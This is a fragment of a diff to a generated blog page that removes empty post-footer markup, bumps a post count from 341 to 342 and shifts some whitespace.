-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2105,7 +2092,7 @@
                 
                   <a href="/archives/%20%7C%7C%20archive">
                 
-                    <span class="site-state-item-count">341</span>
+                    <span class="site-state-item-count">342</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -2804,9 +2791,9 @@
       
     
       
-        
-      
     
+      
+        
       
     
       
